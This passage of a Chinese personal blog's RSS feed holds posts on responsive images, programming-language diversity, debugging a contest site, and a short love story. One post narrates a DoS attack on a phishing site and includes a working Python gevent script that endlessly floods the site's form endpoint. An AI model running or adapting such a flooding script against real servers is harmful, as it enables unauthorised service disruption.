href="https://developers.google.com/speed/webp/?hl=en">WebP</a> 格式去替换它，因为这会缩减 26% 的体积——记住，响应式图片的核心在于 用最小的数据量提供尽可能高质量的图片——然而目前它仅被 Chrome、Opera 和 Android 内置浏览器所支持。我们需要使用 <code>type</code> 属性来确定 <code>WebP</code> 格式是否被支持：</p><div class="gk-code hljs" data-gk-id="BLOCK22"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">picture</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/webp&quot;</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.webp 2x, image.webp 1x&quot;</span> /&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 2x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">picture</span>&gt;</span></span><br></pre></div></div><p >在这个案例中，浏览器会先检查是否支持 <code>WebP</code> 格式。如果是，它会继续判断屏幕是否有足够的像素密度去显示 <code>retina-image,webp</code> 图片，如果不是，则会显示 <code>image.webp</code> 。倘若 <code>WebP</code> 不被支持，浏览器将会径直跳至 <code>img</code> 标签处并解析——这部分我们已经非常熟悉了。</p><p ><code>type</code> 属性的出现，意味着在环境支持的情况下，我们可以可以提供体积更小的图片格式。</p><h3 id="已知的问题">已知的问题</h3><p >在 IE9 中有一个已知的问题：<code>picture</code> 标签将不会静默失败。为了处理 IE9 的情况，你需要欺骗 IE9，让它以为 <code>source</code> 标签是 <code>video</code> 标签的一部分：</p><div class="gk-code hljs" data-gk-id="BLOCK23"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">picture</span>&gt;</span></span><br><span class="line">    &lt;!—[if IE 9]&gt;<span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span>&lt;![endif]—&gt;</span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/webp&quot;</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.webp 2x, image.webp 1x&quot;</span> /&gt;</span></span><br><span class="line">    &lt;!—[if IE 9]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span>&lt;![endif]—&gt;</span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;retina-image.jpg 2x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">picture</span>&gt;</span></span><br></pre></div></div><p >这是一个丑陋的解决方案——但聊胜于无。我们只能期望 Windows10 的发布能够加速 IE9 退出市场，因为虽然 Edge 也不支持 <code>picture</code> 标签，但至少它会用正确的方式来处理（静默失败）。</p><p >当然，也有相应的 <a href="https://scottjehl.github.io/picturefill/">polyfills</a> 来实现 IE 对 <code>picture</code> 的兼容，但我的建议是去避免它。我从来不信任用 Javascript 打补丁，因为这会极大地影响性能，同时也让代码变得不可维护。</p><p >出于这种原因，我建议现在还是最好不要使用 <code>picture</code> 标签。除非，你在运营一个大规模的电子商务网站，由 <code>WebP</code> 格式节省下来的下载时间实在不足以弥补因对代码打补丁所带来的不便。</p><p >一旦 IE9 的市场份额降至 1% 以下——也许发生在明年的某一个时刻（译者注：歪果仁的看法不代表天朝的实际情况），<code>picture</code> 标签就会变得可以接受（viable）。如果你在 2016 年读到这篇文章，或许，这种方案值得你去实践。</p><h2 id="创建-响应式图片">创建 响应式图片</h2><p >位图并不会自己放大——这点和 SVG 不一样。面对这个问题，我们的解决方法是：使用 <code>srcset</code> 或者是 <code>picture</code>，从而为不同能力的浏览器提供不同的图片。因此，我们需要提供许多种不同尺寸的图片。</p><p >许多图片编辑软件都实现了图片自动化多尺寸导出——无论使用何种软件，你都可以轻松获得各种尺寸的图片，而无需亲自逐一调整。</p><p >Adobe Photoshop 是一款事实上的（de facto）位图编辑器。尽管对于设计工作者而言，它并不是一个很好的选择，但不可否认的是——用它来设计图片确实是一种享受（smooth &amp; reliable）。在 Photoshop 中，多图输出的实现相对直接一些：</p><ol><li>打开图片，并将其放在一个独立的图层上。 <img loading="lazy" src="http://netdna.webdesignerdepot.com/uploads/2015/08/step_1.jpg" alt=""></li><li>将图层重命名为你要生成的文件的名字（包括扩展名）<img loading="lazy" src="http://netdna.webdesignerdepot.com/uploads/2015/08/step_2.jpg" alt=""></li><li>勾选 文件 -&gt; 生成 -&gt; 图片资源，然后 Photoshop 会在 PSD 文件旁生成一个新目录，其中有生成好的图片。</li><li>再次重命名图层，在每个文件名前加上对应的缩放尺寸。一旦图层被重命名，对应的图片便会自动生成，因此不必重复 步骤 3。<img loading="lazy" src="http://netdna.webdesignerdepot.com/uploads/2015/08/step_4.jpg" alt=""></li></ol><p ><em>（图片版权归 <a href="http://www.freeimages.com/photo/bikes-1447404">Philip Collier</a> 所有）</em></p><p >若想了解更多关于 使用 Photoshop 生成图片 的知识，请点击 (这里)[<a href="https://helpx.adobe.com/photoshop/using/generate-assets-layers.html)%E3%80%82">https://helpx.adobe.com/photoshop/using/generate-assets-layers.html)。</a></p><p >基于这些图片，我们便可以给浏览器提供 5 种选择：</p><div class="gk-code hljs" data-gk-id="BLOCK24"><div class="gk-code-display"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">srcset</span>=<span class="hljs-string">&quot;bikes_3x.jpg 3x, bikes_2-5x.jpg 2.5x, bikes_2x.jpg 2x, bikes_1-5x.jpg 1.5x&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;bikes_1x.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;an image&quot;</span> /&gt;</span></span><br></pre></div></div><h2 id="结语">结语</h2><p ><code>img</code> 标签已经度过了漫长的 20 个春秋——或者更精确地说，在伴着缺点（inadequate）缓慢行进了 18 年后，<code>img</code> 标签在最后的两年突然“奋起直追”，直到变成今天这个相对复杂（sophisticated）的样子。</p><p >当然最重要的是：<strong>我们找到了解决方案</strong>。</p><p >迄今为止，在 <code>srcset</code> 和 <code>picture</code> 这两个可选项中，前者的浏览器支持相对比较完善。如果你的网站已经完成了 95%，<code>srcset</code> 的高级特性及其简洁的实现将是你的不二之选。</p><p >如果你在运营一个庞大的电子商务网站，有成千上万的产品图片需要显示，最佳的实践便是使用 WebP 格式的图片——随着 <code>picture</code> 元素的支持被不断完善，这一切的付出都是值得的。</p><p >浏览器无法依据当前的网络状况来选择适合的图片——这是现有解决方案最大的缺点。这不是我们所能左右的。在当下，我们只能祈求“好马配好鞍”了。</p><p >用最小的尺寸提供最高质量的图片，终于成为了可能。这意味着：在不久的将来，我们将能拥抱（embrace）更好的用户体验。</p><p ><em>（图片引用：<a href="http://www.shutterstock.com/pic-84977458.html">mountains</a> &amp; <a href="http://www.shutterstock.com/pic-116864680.html">devices</a>，来自 Shutterstock）</em></p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Translation/">Translation</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Web-Design/">Web Design</category>
      
      
      <comments>https://i.hsfzxjy.site/the-state-of-responsive-images-in-2015/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>【译】“为什么有这么多的编程语言？”</title>
      <link>https://i.hsfzxjy.site/why-are-so-many-programming-languages/</link>
      <guid>https://i.hsfzxjy.site/why-are-so-many-programming-languages/</guid>
      <pubDate>Thu, 17 Sep 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 原文链接：&lt;a href=&quot;http://blog.stackoverflow.com/2015/07/why-are-there-so-many-programming-languages/&quot;&gt;戳这里&lt;/a&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 原文链接：<a href="http://blog.stackoverflow.com/2015/07/why-are-there-so-many-programming-languages/">戳这里</a></p></blockquote><p >在过去的一周中，几位同事曾两次问了我这个问题。听起来，这像是一个糟糕的问题，但事实上并不是这样的。</p><p >最简短的答案就是：<strong>尽管我们并不需要这么多语言，但我们还是想要（want）它们。</strong> 让我们再探索得更深一些吧。</p><h2 id="难道它们不都是一样的吗？">难道它们不都是一样的吗？</h2><p >某种意义上（In a sense），是的。创建一个网站，你可以使用 <code>Ruby</code>、<code>Java</code>、<code>Python</code>、<code>C#</code>、<code>Go</code> 抑或是 <code>Javascript</code>。甚至，你可以使用 <code>C</code> 或 <code>C++</code> 或 <code>Haskell</code> 或 <code>Rust</code> 或 <code>COBOL</code> 或 <code>Pascal</code> 或 <code>Perl</code>。</p><p >事实的背后就是：这些语言都有着同样的目的——把人类的思想转变成为计算机能够读懂的 1 和 0——用夸张的（highfalutin）的计算机术语来讲：它们都是 <a href="https://en.wikipedia.org/wiki/Turing_completeness">图灵完备（Turing complete）</a> 的。</p><p >从底层上来看，这些语言都<strong>是</strong>完全一样的。但从表面（人类和它们交互的接口）上来看，它们却有很大的不同。这，便是人们关注的焦点了。</p><h2 id="不同的任务需要不同的工具">不同的任务需要不同的工具</h2><p >事实上，编程语言只是工具，而对于不同的任务，我们需要选择不同的工具。拖拉机（tractor trailer）、自行车、特斯拉汽车（Tesla）都是交通工具——它们都有轮子，有转向器（steering ?），并且都会将你从一个地方带到另一个地方——但显然，我们要将它们运用到不同的场景中。</p><p >编程语言也是类似的：若是要构建网站，<code>Ruby</code> 和 <code>Javascript</code> 是不错的选择；<code>Java</code> 和 <code>C++</code> 则常常被运用在金融领域；至于 <code>Python</code> 和 <code>R</code>，它们是统计分析的工具。</p><p >在语言的选择上，我们常常要从便捷程度、安全性和速度这几个方面进行权衡（trade-offs）——就像交通工具一样。通常来讲，需要根据手头上的工作视情况而定。</p><h2 id="开发者们有不同的口味（tastes）">开发者们有不同的“口味”（tastes）</h2><p >抛开纯粹的功能，开发者还会根据个人的“口味”来选择工具。</p><p >编程语言是人类向计算机<strong>表达</strong>想法的工具。尽管不同的开发者在许多方面都有相似之处，我们的思考方式仍存在着区别——这是自然所决定的。</p><p >由于有多种编程语言供我们选择，我们完全可以选择一种“以我们想要的方式工作”的语言。有的开发者喜欢<code>Ruby</code>的灵活性（flexibility），而另一些则喜欢<code>Java</code>的严谨（strictness）。同时，有些语言看上去和数学一样深奥，而另一些读起来却和散文一样（prose）。</p><h2 id="以人为本">以人为本</h2><p >业务是以人为本的。</p><p >撇开功能和个人“口味”，通常来说，你会选择一种你了解的，或是你周围的人了解的语言。</p><p >Stack Overflow 选择了 <code>C#</code>，很大程度上是因为团队的创始人了解它。其次（In turn），它也是为创始人的朋友和同事所了解的。<code>C#</code> 使招聘工作（recruiting）变得更加简单，同时也使 Stack Overflow 更快地进入市场。</p><p >（幸运的是，<code>C#</code> 同时也有着超棒的技术亮点）</p><p >一种技术需要一个“生态圈”（ecosystem）来支持——那便是能为每个有需要的开发者提供工具和帮助的社区（communities）和组织（organizations）。好的“生态圈”能让个人开发者更加成功——<code>Ruby</code> 就是个很好的例子。</p><h2 id="多样性就是力量">多样性就是力量</h2><p >总的来说，由于我们有着各种各样的任务，同时也有着各种各样的人在完成这些任务，我们才有了各种各样的编程语言。</p><p >而正是这种多样性的存在，使得许多有趣的程序，有趣的公司甚至是有趣的职业生涯，从不可能成为了可能。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Translation/">Translation</category>
      
      
      <comments>https://i.hsfzxjy.site/why-are-so-many-programming-languages/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Wisecity 商赛总结——也谈前端自动化测试</title>
      <link>https://i.hsfzxjy.site/wisecity-conclusion/</link>
      <guid>https://i.hsfzxjy.site/wisecity-conclusion/</guid>
      <pubDate>Thu, 23 Jul 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;真没想到，高伯还是给了我两百块报酬（土豪就是土豪）——我还担心他连运营成本都不肯给呢，毕竟网站做得并不是令人太满意。为社团做了两年的网站，这是第一次收到报酬，也算是自己赚的第一桶金吧。&lt;/p&gt;
&lt;p &gt;事实证明，临去北京前我给 cc 开放了管理者权限是一个非常正确的选择。</description>
        
      
      
      
      <content:encoded><![CDATA[<p >真没想到，高伯还是给了我两百块报酬（土豪就是土豪）——我还担心他连运营成本都不肯给呢，毕竟网站做得并不是令人太满意。为社团做了两年的网站，这是第一次收到报酬，也算是自己赚的第一桶金吧。</p><p >事实证明，临去北京前我给 cc 开放了管理者权限是一个非常正确的选择。尽管 wisecity 已经举办了两届，尽管在此之前我已做过 4 个网站，尽管这次的网站是在上一届的基础上进行改造的，我的心里仍有些忐忑不安，害怕它会出什么问题——抑或是大会的工作人员操作不当导致网站崩溃云云（这事真的发生了）。5 天的 wisecity 大会，我都身在北京，身边没有电脑，没有解决问题的条件，因此需要一个有基本的编程能力的人协助我。5 天下来，问题还不少，调试的过程可谓是十分原始：接到问题后，囿于有限的条件，我只能通过翻看手机上的代码，在脑海中模拟并觉出问题所在，找到最小代价的改动方案，再将改动之处通过短信通知 cc——当然，很多时候并不那么顺利，我还需要跟多的信息帮助判断，比如错误日志，又比如进行特定操作时的表现（这个最坑爹，可遇而不可求）。我尽一切努力在脑海中想象着程序的流程，很累，但也很有挑战性。</p><p >第一天就遇到了一个棘手的问题：高伯在删除测试数据时不小心把管理员账号（admin）一起删掉了。这个消息从扬声器传出后，我足足沉默了一分钟，心里像是有千万头草泥马奔过：</p><blockquote><p >怎么这么毛手毛脚？这下可好了，麻烦大了——虽然这个设计是有些不合理，但这不能怪我，django 已经封装好了（姜戈：怪我咯？）。快想办法快想办法……直接去后台加一个？不行不行，密码这块很难弄，MD5 + SHA1 + Salt，根本不是人能算的——只能让 django 自己产生一个用户了。嗯，我需要一个 MySQL，一个完整的 Python 开发环境，各种包……不知 cc 能不能应付过来。真是的一大早!@#$%^……</p></blockquote><p >挂断电话，抄起手机噼里啪啦给 cc 发了一条短信，手把手教配置 MySQL，django，导出 SQL，上传数据库……吧啦吧啦洋洋洒洒几百字。发送时一直祈祷：但愿 cc 悟性高一些，不然真的完了——还好，半个小时后，前线传来了好消息：一切顺利。</p><p  class="nomargin"> 总算是松了一口气，才发现，背已汗湿。</p><p >然而，事情还没有结束。</p><p >第二天一早，我又被告知：上传的文件下载不了（纳尼？走之前不是才作过测试吗）。点开文件看网址，发现原来是七牛的域名后面少了一个<code>/</code>，很快便处理好了。本以为可以好好玩一天了（那天出去玩），逛了大半个北京，夕阳西下时，却又接到一个 bug：选手列表只显示了 10 个用户，但应该有 40+ 个。</p><p  class="nomargin"> 这个 bug，前后调了 2 个小时。从奥林匹克公园，到中关村——因为，我并不知道问题出在哪，一点也不知道。打 <code>console.log</code>，翻看网络记录（没错！在短信这种高时滞的通讯条件下！），最终发现，原来是 REST 返回的用户列表顺序反了，加载了最后 10 个，但由于用户没有明显的顺序标志，所以调试时没有察觉。改正之后，终于可以安心吃完饭——</p><p  class="nomargin"> 谁知，两分钟后，短信又开始轰炸了：加载的用户列表有重复项！很多的重复项！！没有规律的重复项！！！</p><p  class="nomargin"> 这个 bug，前后又调了 2 个小时。从中关村，再到人大附中，直到繁星爬满了苍穹。第一个反应是自制的瀑布流控件滚动事件并发处理没有做好。翻看源代码，似乎找到一处疑似有问题的地方，尝试让 cc 改了一下——半个小时后，传回了一个令人泄气的消息（中间配置<code>grunt</code>又耗费了好些功夫）。冥想了一个小时，前后端的代码都看遍了，就是没有发现问题，最终只得放弃，告诉高伯用一些奇技*巧避开重复项。直至回来后，静下心分析代码，才发现在一个不起眼的地方有一处笔误，这是重构 HFMUN 的瀑布流控件时产生的。</p><p >之后的几天，又有几个大大小小的 bug，抑或是需求改动，处理得还算顺利。可怕的是最后一天，KVDB 直接宕掉了——我整个缓存都是挂在 KVDB 上的，也怪当时没有作容灾处理，这个事件直接导致全站报 500 错误。急急忙忙关掉了缓存（还好做缓存时解了耦，只需改动两处即可），然后再质问 SAE，这些都是后话了。</p><p >然而，这里有个值得反思的问题：既然我已经作过 4 个网站，为何还是会有 bug 出现？从 HFMUN 1.0，到 wisecity 1.0，到 HFMUN 2.0，随着我技术的逐渐成熟，bug 出现的频率也在不断下降——但是 bug 仍在，就像“杀不死的小强”一样。</p><p >测试，关键还是在测试。</p><p >人的主观意识，受制于时空、环境等诸多因素，任何一个参数的改变都有可能影响主观能动性的发挥。因此，不能保证在任何时候人的意识都能正确地、高效地发挥作用。软件工程，作为人类纯意识的产物，其正确性并不能百分百地保证。或是精神不振引起的一处笔误，或是重构迁移时没有同步更改的一处配置，抑或是一处自己在开发过程中完全没有意识到的错误——设计归设计，程序是否能运行，还是电脑说了算。许多的 bug 就是这样产生的。</p><p >这个时候，单元测试（Unit Test）就显得非常重要了。通过分析需求而设计的测试样例，可以保证功能的相对正确性，即在能够考虑到的所有情况下，程序都能狗正常运行。这是重构（Refactory）过程中十分重要的一个环节，因为外部不变性是重构必须遵守的一个准则。</p><p >在软件工程的上古时代，测试常常是由人工来完成的。团队中，总有几名成员每天都在做着重复、机械的工作，即对新增的功能或是修改过的功能进行测试。这种测试机制费时费力，同时也不是非常有效——上面已经说过了，没有人能保证主观意识的正确性。后来，出现了基于脚本的批量测试，测试人员可以编写一小段代码对特定的功能进行校验，很大程度地提高了效率；再到今天的分布式测试，成熟的测试系统可以模拟多种不同的生产环境，检测到代码库的变化后，便会自动进行单元测试。这是单元测试的自动化进程。</p><p >今天的自动化测试固然很成熟，基本可以检测到各种逻辑错误。但在测试领域，却仍有一处令其束手无策的“禁地”——这便是 GUI 测试。综合分析 wisecity2.0 的 bugs，其中大部分都是前端出了问题。GUI 测试的麻烦在于：</p><ul><li>GUI 是一个输入与输出交替进行的系统，并且输入具有无限的可能，无法用有限的测试样例对输入进行覆盖。比如第二天发生的那个 bug 需要在“文件上传成功后，跳转到首页，点击下载链接”、“用户数量超过 10 个，在列表页面快速滚动鼠标滚轮”才能被触发。许多的 bug 只有在真实生产环境中被用户捕捉到。</li><li>GUI 的正确性没有一个绝对的判定标准。元素错位、颜色不正确，这些事件都不报错，但它们也是 bug，通常也只有人类认为它们是 bug。但它们的发生并不影响功能，只是用户体验（User Experience）不好——用户体验是一个纯主观的概念，至少在当下，计算机是不能理解的。</li></ul><p >目前，GUI 测试主要还是依赖人工。Facebook 就有一个庞大的测试人员系统，以模拟尽可能多的用户操作样例。诚然，业界已经开始出现一些 前端自动化测试框架，有如 selenium、phantomjs 等通过 mock 事件模拟用户操作，更有甚者如 PhantomCSS 可以对特定操作的结果进行像素比对，可软件的主观部分还是需要人脑来判断。</p><p >这是一个好时代，周围的一切都在飞快地变化着。希望在不久的将来，当人工智能出现时，这个问题能够有效地解决。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Conclusion/">Conclusion</category>
      
      <category domain="https://i.hsfzxjy.site/tags/WiseCity/">WiseCity</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Automatic-Test/">Automatic Test</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Front-End/">Front End</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Unit-Test/">Unit Test</category>
      
      
      <comments>https://i.hsfzxjy.site/wisecity-conclusion/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>记一次 DoS 诈骗网站的经历</title>
      <link>https://i.hsfzxjy.site/how-to-fuck-a-bilk-site/</link>
      <guid>https://i.hsfzxjy.site/how-to-fuck-a-bilk-site/</guid>
      <pubDate>Thu, 23 Jul 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 &lt;a href=&quot;http://wap</description>
        
      
      
      
      <content:encoded><![CDATA[<p >题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p><blockquote><p  class="noindent"> 尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com">wap.abchyd.com</a> 进行领取！【农业银行】</p></blockquote><p >1024 元？哼！这个数还挺整，但一看就是诈骗短信：哪有银行的域名长得和天书一样？更何况，我又没有农行的账户。</p><p >正待删除时，一个念头划过脑海，指尖悬停在屏幕上方。</p><p >突然想起昨天在 Freebuf 上看到的一篇文章，说是一个黑帽把臭名昭著的“10086 诈骗”给调戏了一番，在其数据库里填满了垃圾。Freebuf 上许多黑技术我从来都是可望而不可即，唯独这个比较简单——不就是写个脚本嘛，几分钟的事。既然他骗人骗到我这里来了，何不好好调戏一下呢？</p><p >果断打开电脑，打开 Chrome，输入网址，映入眼帘的是一个表单（网站已被黑掉因此就没有图了，好吧我错了），要求用户填写 银行卡、密码、手机号还有一个逼格很高的验证码。</p><p >F12 分析，发现对各个字段的校验仅仅局限于长度的检查，连格式检查都没有。至于验证码，随便填写四个数字就可以通过了（真是弱爆了，好吗！）。表单提交后跳转到一个有菊花加载圈的页面——说是“稍等，切勿关闭页面”，但其实这个页面并不会跳转，也不会有其他的操作，只有那个菊花一直在转。扫一眼地址栏，发现是<code>asp</code>结尾——这又给了我不小的鼓励（这里并没有黑微软的意思，ASP 是十年前的产物，放在现在可以说是弱的不行了）。</p><p >该怎么调戏呢？一个想法飞快地在脑海中产生——对了，就用高并发的垃圾数据拖爆它的数据库吧。这类钓鱼网站通常都是 IIS 6.0 + ASP + SQL SERVER，并且还是单机服务器，并发度一高机器很容易就垮了。</p><p >简单地写了一个脚本：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment">#! /usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> gevent.monkey</span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="hljs-keyword">import</span> gevent</span><br><span class="line"><span class="hljs-keyword">import</span> urllib2, urllib</span><br><span class="line"><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():</span><br><span class="line">    <span class="hljs-built_in">id</span> = <span class="hljs-built_in">str</span>(uuid1())[:<span class="hljs-number">16</span>]</span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;fucking&#x27;</span>, <span class="hljs-built_in">id</span></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        urllib2.urlopen(<span class="hljs-string">&#x27;http://www.abchyd.com/add_1.asp&#x27;</span>, urllib.urlencode({</span><br><span class="line">            <span class="hljs-string">&#x27;logonCardNum&#x27;</span>: <span class="hljs-built_in">id</span>,</span><br><span class="line">            <span class="hljs-string">&#x27;netType&#x27;</span>: <span class="hljs-string">&#x27;111111&#x27;</span>,</span><br><span class="line">            <span class="hljs-string">&#x27;tel&#x27;</span>: <span class="hljs-string">&#x27;12345678900&#x27;</span>,</span><br><span class="line">            <span class="hljs-string">&#x27;randomId&#x27;</span>: <span class="hljs-string">&#x27;1234&#x27;</span></span><br><span class="line">        }))</span><br><span class="line">    <span class="hljs-keyword">except</span>:</span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;fucking&#x27;</span>, <span class="hljs-built_in">id</span>, <span class="hljs-string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">    gevent.joinall([gevent.spawn(fuck) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)])</span><br><span class="line"></span><br></pre></div></div><p >这里用 <code>gevent</code> 将 Socket 由阻塞型改装为协程型，以提高请求的并发度。</p><p >接着，关掉所有的图形界面，只开一个终端（为了节省内存），运行 <code>./fuckit.py</code>。哈哈哈，受死吧！</p><p >用平板再次打开该网址（电脑已经跑不起浏览器了），可以发现网站已经明显慢了下来，时不时还会有 500 错误。</p><p >两个小时后。</p><p >当我再次访问网站时，它已经完全当机了。用<code>nmap</code>扫了一遍，也没有端口活着了。一台邪恶的服务器就这样被干掉了。</p><p >但我知道，这样的服务器，在世界上还存在着许多许多。曾经有段时间，不断遇到域名为 <a href="http://www.10086xxx.com">www.10086xxx.com</a> 的诈骗网站。常常是一个域名被封了，另一个域名便冒出来，可见诈骗者拥有海量的资源。</p><p >这次的攻击只是一次游戏，一次尝试，得以成功只是因为对方太弱了。</p><p >真正的网络攻防战，远不止如此。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/DDoS/">DDoS</category>
      
      
      <comments>https://i.hsfzxjy.site/how-to-fuck-a-bilk-site/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>不能说的秘密</title>
      <link>https://i.hsfzxjy.site/secret/</link>
      <guid>https://i.hsfzxjy.site/secret/</guid>
      <pubDate>Thu, 11 Jun 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;又遇到了一道难题。他轻轻放下笔，缓缓抬起了头。无意中，目光触及了她的背影。夕阳透过窗子，给那一隅洒下一片金黄，增添了几分童话般的意境。&lt;/p&gt;
&lt;p &gt;他的心动了一下，但很快又抑制住了那种奇妙的感觉。随即，他笑了笑，便埋下头去，继续解决那道艰深的难题。&lt;/p&gt;
&lt;p &gt;他</description>
        
      
      
      
      <content:encoded><![CDATA[<p >又遇到了一道难题。他轻轻放下笔，缓缓抬起了头。无意中，目光触及了她的背影。夕阳透过窗子，给那一隅洒下一片金黄，增添了几分童话般的意境。</p><p >他的心动了一下，但很快又抑制住了那种奇妙的感觉。随即，他笑了笑，便埋下头去，继续解决那道艰深的难题。</p><p >他知道，这一切，只是为了那个诺言。</p><p >他清楚地记得，在早些时候，他和她许下了一个诺言：这三年，我们就把对方当成空气吧，谁也不认识谁。</p><p >很奇怪的约定，不是吗？既然是同班同学，抬头不见低头见，又何出此言。</p><p >想到这，他竟有些羞愧起来。</p><p >而事实上，在更早些的时候，他们的关系并不是这样的——甚至，还是较要好的朋友。在那个遥远的年代，当女孩还未成为少女，他们还曾一起外出学习，一起嬉闹。他俩的相识源于各自父母的同学关系——他很高兴，她也很高兴，自己有这么一个朋友。</p><p >是的，只是朋友，不是别的什么——一个令人向往的时候。</p><p >上了初中，尽管进了不同的班级，他还是偶尔会去找她。一切依旧。</p><p >但不知为何，一些奇怪的话却在班上渐渐漫开，如同疯长的野草。每一次去找她，他都感觉背后有人在窃窃私语，甚至还有几双异样的目光。诚然，在这个情窦初开的年纪，这样的一种关系是很敏感的。</p><p >起初，他很反感这些言论。每一次，他都会极力辩解，甚至和对方吵得面红耳赤。可换来的，却是各种鬼脸，以及更加刻薄的话，就像火上浇油一般。</p><p >渐渐地，他学会了沉默。为了避开那些讨厌的话，也不再那么频繁地去找她了。</p><p >但，不知为什么，这之后每次想起她，心里却多了一些异样的感觉——这在以前是没有的，一种莫名的、不由自主的激动，一种朦胧的依恋——</p><p >就像那流言蜚语所说的，他喜欢上她了。</p><p >人，真是奇怪的动物。</p><p >他不再对那些传言感到愤怒，甚至，还附和起来，公开表露自己的心声——这时，他清楚：这已不再是传言，而是自己真实的想法。</p><p >然而，她却在悄悄地发生变化——不知为何，他每次去找她，她却借故不出来。在路上相遇，也不打招呼，没有微笑，宛如陌生人一般。</p><p >他很奇怪，却也没多想，大概是有了新朋友罢——人都会长大的。</p><p >直到，那个落雨的夏夜。</p><p >那天，正是中考放榜的日子，他得知她和自己考入了同一所重点高中，并进入了同一个重点班，很是兴奋。刚想通过 QQ 为她庆贺，不料却发觉：自己已被她拉黑了。</p><p >想起初中三年的种种变化，他再也忍不住了，立即发短信询问她。得到的，却是她冰冷的回复：</p><p >“之前我一直把你当朋友，可你却把我们想成某种关系，还到处宣扬。这让我很受伤。我想，我们还是不要做朋友了……”</p><p >“接下来的三年，我真的不知道该如何度过，和你同在一个班，我真的很痛苦。就把我当成空气吧，这样对你我都好……”</p><p >他沉默了，回想自己的种种，的确，有些太过分了。但他却不知，这些事，会如此伤她的心。</p><p >也好，就让我们彼此当陌生人吧。</p><p >夕阳转了个角度，那一片金黄在一点点扩大，但同时也变得更加温柔。</p><p >两年了，他们没有说过一句话。</p><p >尽管流言蜚语早已不在，他也不愿再与她接触——一切，都是因为那个诺言。</p><p >如果不能做朋友，那不伤害对方，也是一种善良。</p><p >“之前你们关系不是很好的吗？怎么现在像不认识了一样？”两年来，常有好奇的人问他。</p><p >每一次，他都会神秘地笑一笑：</p><p >“这是一个不能说的秘密。”</p><p >（致：那个被伤害过的她）</p>]]></content:encoded>
      
      
